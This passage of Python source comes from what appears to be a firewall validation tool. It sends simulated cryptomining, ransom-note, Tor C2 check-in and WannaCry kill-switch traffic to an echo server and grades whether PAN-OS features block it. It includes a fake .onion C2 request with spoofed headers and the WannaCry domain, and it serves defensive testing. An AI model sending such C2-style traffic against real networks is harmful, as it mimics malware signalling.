                    return self._passthrough_result(test, resp.status_code,
                        f'Mining pool domain access ({payload}) not blocked — '
                        'Enable URL Filtering to block cryptocurrency mining category',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — mining pool domain blocked',
                    resp.status_code, url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — URL Filtering detected mining pool domain: {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown cryptomining test: {test.id}')

    def _test_ransomware(self, test: SecurityTestCase, host: str,
                          http_port: int) -> SecurityTestResult:
        """Test ransomware detection patterns."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'ransom_note':
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={'Content-Type': 'text/plain'}, timeout=10)
                if resp.status_code == 200 and 'ENCRYPTED' in (resp.text or '').upper():
                    return self._passthrough_result(test, resp.status_code,
                        'Ransomware note with Bitcoin wallet address passed through — '
                        'Anti-Spyware or Data Filtering should detect ransom payment demands',
                        resp=resp, url=url, method='POST', sent_payload=payload[:80])
                return self._analyze_response(test, resp, 'ENCRYPTED',
                    url=url, method='POST', sent_payload=payload[:80])
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — ransomware note content detected: {e}',
                    url=url, method='POST', sent_payload=payload[:80])

        elif test.id == 'ransom_c2_tor':
            url = f'http://{host}:{http_port}/echo?payload=tor-c2-checkin'
            try:
                resp = _raw_http_get(host, http_port,
                    '/echo?payload=tor-c2-checkin',
                    extra_headers={
                        'Host': 'k5zq47j6wd3wdvjq.onion',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0 TorBrowser/8.0',
                        'X-Tor-Circuit': 'ransomware-c2',
                    }, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Ransomware Tor C2 request (.onion Host + TOR User-Agent) accepted — '
                        'Anti-Spyware or URL Filtering should detect Tor hidden service access',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Tor C2 pattern blocked',
                    resp.status_code, url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — ransomware Tor C2 pattern detected: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'ransom_wannacry':
            url = f'http://{host}:{http_port}/echo?payload=wannacry-killswitch'
            try:
                resp = _raw_http_get(host, http_port,
                    '/echo?payload=wannacry-killswitch',
                    extra_headers={
                        'Host': payload,  # iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
                    }, timeout=10)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'WannaCry kill-switch domain access succeeded — '
                        'Anti-Spyware should detect the characteristic WannaCry domain pattern',
                        url=url, method='GET', sent_payload=payload)
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — WannaCry domain blocked',
                    resp.status_code, url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test,
                    f'Connection blocked — WannaCry ransomware pattern detected: {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown ransomware test: {test.id}')

    # ─── Built-in Test Overrides ─────────────────────────────

    def get_builtin_test(self, test_id: str) -> Optional[dict]:
        """Return the original unmodified built-in test for reset purposes."""
        original = TEST_MAP.get(test_id)
        if not original:
            return None
        return {
            'id': original.id, 'name': original.name, 'category': original.category,
            'description': original.description, 'expected_action': original.expected_action,
            'panos_feature': original.panos_feature, 'payload': ATTACK_PAYLOADS.get(original.id, ''),
            'method': original.method, 'headers': original.headers,
            'target_path': original.target_path,
        }

    def save_override(self, test_id: str, updates: dict) -> Optional[dict]:
        """Save an override for a built-in test. Uses custom store with override_of field."""
        if test_id not in TEST_MAP:
            return None
        if not self._custom_store:
            return None
        original = TEST_MAP[test_id]
        # Check if override already exists
        existing = None
        for p in self._custom_store.list():
            if p.get('override_of') == test_id:
                existing = p
                break
        override_data = {
            'name': updates.get('name', original.name),
            'category': updates.get('category', original.category),
            'description': updates.get('description', original.description),
            'payload': updates.get('payload', ATTACK_PAYLOADS.get(test_id, '')),
            'method': updates.get('method', original.method),
            'headers': updates.get('headers', original.headers),
            'target_path': updates.get('target_path', original.target_path),
            'expected_action': updates.get('expected_action', original.expected_action),
            'panos_feature': updates.get('panos_feature', original.panos_feature),
            'override_of': test_id,
        }
        if existing:
            result = self._custom_store.update(existing['id'], override_data)
        else:
            result = self._custom_store.add(override_data)
        self._reload_custom()
        return result

    def delete_override(self, test_id: str) -> bool:
        """Remove override for a built-in test (reset to default)."""
        if not self._custom_store:
            return False
        for p in self._custom_store.list():
            if p.get('override_of') == test_id:
                self._custom_store.delete(p['id'])
                self._reload_custom()
                return True
        return False

    # ─── Response Analysis ──────────────────────────────────

    def _analyze_response(self, test: SecurityTestCase, resp,
                          payload_marker: str, url='', method='',
                          sent_payload='') -> SecurityTestResult:
        """Determine if a response indicates the attack was blocked or passed through."""
        if self._is_block_page(resp):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — Block page detected', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        if resp.status_code in (403, 406, 503):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — blocked by firewall', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        # Firewall may return RST as a redirect or non-standard status
        if resp.status_code in (502, 504):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — upstream blocked by firewall', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        if resp.status_code == 200:
            body = resp.text or ''
            if payload_marker and payload_marker in body:
                return self._passthrough_result(test, resp.status_code,
                    'Payload echoed back — attack passed through firewall',
                    resp=resp, url=url, method=method, sent_payload=sent_payload)
            # If echo server responded but the payload is NOT in the body,
            # the firewall likely stripped/modified the payload before forwarding
            if 'Echo Response' in body:
                # Check if the echo payload div is empty or different from what we sent
                if payload_marker and payload_marker not in body:
                    return self._blocked_result(test,
                        'Echo server responded but payload was stripped/modified — firewall sanitized the request',
                        resp.status_code, resp=resp, url=url, method=method, sent_payload=sent_payload)

        # Empty response body with 200 can indicate firewall intervention
        if resp.status_code == 200 and not (resp.text or '').strip():
            return self._blocked_result(test,
                'HTTP 200 with empty body — firewall may have stripped the response',
                resp.status_code, resp=resp, url=url, method=method, sent_payload=sent_payload)

        return self._passthrough_result(test, resp.status_code,
            f'HTTP {resp.status_code} — not blocked',
            resp=resp, url=url, method=method, sent_payload=sent_payload)

    def _is_block_page(self, resp) -> bool:
        """Check if response contains a PAN-OS block page."""
        text = resp.text.lower() if resp.text else ''
        for marker in BLOCK_PAGE_MARKERS:
            if marker.lower() in text:
                return True
        return False

    def _blocked_result(self, test, detail, status_code=0,
                        resp=None, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, f'Firewall should block this {test.panos_feature} threat')
        proto = method if method in ('DNS', 'SSH', 'FTP') else 'HTTP'
        if proto == 'HTTP':
            how = 'The connection was reset, timed out, or a block page was returned'
        else:
            how = f'The {proto} connection was refused, reset, or timed out'
        explanation = (f'PASS — The firewall correctly blocked this attack. '
                      f'{how}, indicating that {test.panos_feature} detected the threat pattern.')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='blocked',
            verdict='PASS', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, threat_id=test.threat_id,
            timestamp=time.time(), description=test.description,
            payload=sent_payload, url=url, method=method,
            expected_behavior=expected,
            response_body_snippet=_resp_snippet(resp) if resp else '',
            response_headers=_resp_headers(resp) if resp else {},
            verdict_explanation=explanation)

    def _passthrough_result(self, test, status_code, detail,
                            resp=None, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, f'Firewall should block this {test.panos_feature} threat')
        proto = method if method in ('DNS', 'SSH', 'FTP') else 'HTTP'
        if proto == 'DNS':
            resp_desc = 'The DNS query was resolved without interception'
        elif proto in ('SSH', 'FTP'):
            resp_desc = f'The {proto} connection succeeded without interception'
        else:
            resp_desc = f'The server responded with HTTP {status_code} and the payload was delivered'
        explanation = (f'FAIL — The attack was NOT blocked by the firewall. '
                      f'{resp_desc}. '
                      f'Verify: (1) {test.panos_feature} profile is attached to the security policy rule, '
                      f'(2) the traffic between client and server matches the policy rule (correct zones/IPs), '
                      f'(3) the action is set to "reset-both" or "drop" (not "alert").')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='passed_through',
            verdict='FAIL', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, threat_id=test.threat_id,
            timestamp=time.time(), description=test.description,
            payload=sent_payload, url=url, method=method,
            expected_behavior=expected,
            response_body_snippet=_resp_snippet(resp) if resp else '',
            response_headers=_resp_headers(resp) if resp else {},
            verdict_explanation=explanation)

    def _error_result(self, test, detail, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, '')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='error',
            verdict='ERROR', response_code=0, detail=detail,
            panos_feature=test.panos_feature, threat_id=test.threat_id,
            timestamp=time.time(), description=test.description,
            payload=sent_payload, url=url, method=method,
            expected_behavior=expected,
            verdict_explanation=f'ERROR — Test could not complete: {detail}')
